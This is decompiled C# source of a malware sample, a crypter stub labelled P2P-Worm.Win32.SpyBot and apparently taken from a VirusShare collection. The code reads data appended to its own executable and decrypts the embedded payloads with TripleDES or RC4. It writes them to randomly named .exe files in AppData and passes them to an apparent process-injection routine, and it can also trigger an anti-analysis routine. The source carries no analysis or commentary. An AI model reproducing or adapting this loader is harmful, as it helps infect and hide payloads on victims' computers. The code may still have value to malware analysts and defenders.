// Decompiled with JetBrains decompiler
// Type: winini.Mymod
// Assembly: winini, Version=2.0.0.2, Culture=neutral, PublicKeyToken=null
// MVID: FD868ADB-5E8B-4953-B148-111F95D9107A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\P2P-Worm.Win32.SpyBot.qgm-5ec2309251c35c00917dc0260ab9baae75fa44ffefc6119124db8aa12853d156.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace winini
{
  [StandardModule]
  internal sealed class Mymod
  {
    private static string res;
    private static string thepath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";

    public static int RandomNumber(int min, int max) => new Random().Next(min, max);

    public static string RandomString(int size, bool lowerCase)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      int num1 = checked (size - 1);
      int num2 = 0;
      while (num2 <= num1)
      {
        char ch = Convert.ToChar(Convert.ToInt32(26.0 * random.NextDouble() + 65.0));
        stringBuilder.Append(ch);
        checked { ++num2; }
      }
      return lowerCase ? stringBuilder.ToString().ToLower() : stringBuilder.ToString();
    }

    public static string GetRandom()
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append(Mymod.RandomString(4, true));
      stringBuilder.Append(Mymod.RandomNumber(1000, 9999));
      stringBuilder.Append(Mymod.RandomString(2, false));
      return stringBuilder.ToString();
    }

    public static void Main()
    {
      string Delimiter = "/Assembly/";
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      Mymod.res = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref Mymod.res);
      FileSystem.FileClose(1);
      string[] strArray = Strings.Split(Mymod.res, Delimiter);
      string str1 = Mymod.GetRandom().ToString() + ".exe";
      string str2 = strArray[2];
      string Left1 = strArray[3];
      string Left2 = strArray[4];
      string fileName = strArray[5];
      if (Operators.CompareString(fileName, "own", false) == 0)
        fileName = Process.GetCurrentProcess().MainModule.FileName;
      if (Operators.CompareString(Left2, "true", false) == 0)
        ant.mofo();
      if (Operators.CompareString(strArray[6], "yes", false) == 0)
      {
        if (Operators.CompareString(Left1, "tripleDES", false) == 0)
        {
          FileSystem.FileOpen(1, Mymod.thepath + "a" + str1, OpenMode.Binary);
          FileSystem.FilePut(1, _3des.a(strArray[7], str2, true), -1L, false);
          FileSystem.FileClose(1);
        }
        else if (Operators.CompareString(Left1, "rc4", false) == 0)
        {
          FileSystem.FileOpen(1, Mymod.thepath + "a" + str1, OpenMode.Binary);
          FileSystem.FilePut(1, _4cr.enc(strArray[7], str2), -1L, false);
          FileSystem.FileClose(1);
        }
        FileStream fileStream = new FileInfo(Mymod.thepath + "a" + str1).OpenRead();
        long length = fileStream.Length;
        if (length > 0L)
        {
          byte[] numArray = new byte[checked ((int) (length - 1L) + 1)];
          fileStream.Read(numArray, 0, checked ((int) length));
          rp.MakeIt(numArray, fileName);
          fileStream.Close();
        }
      }
      if (Operators.CompareString(Left1, "tripleDES", false) == 0)
      {
        FileSystem.FileOpen(1, Mymod.thepath + str1, OpenMode.Binary);
        FileSystem.FilePut(1, _3des.a(strArray[1], str2, true), -1L, false);
        FileSystem.FileClose(1);
      }
      else if (Operators.CompareString(Left1, "rc4", false) == 0)
      {
        FileSystem.FileOpen(1, Mymod.thepath + str1, OpenMode.Binary);
        FileSystem.FilePut(1, _4cr.enc(strArray[1], str2), -1L, false);
        FileSystem.FileClose(1);
      }
      FileStream fileStream1 = new FileInfo(Mymod.thepath + str1).OpenRead();
      long length1 = fileStream1.Length;
      if (length1 > 0L)
      {
        byte[] numArray = new byte[checked ((int) (length1 - 1L) + 1)];
        fileStream1.Read(numArray, 0, checked ((int) length1));
        rp.MakeIt(numArray, fileName);
        fileStream1.Close();
      }
      ProjectData.EndApp();
    }
  }
}
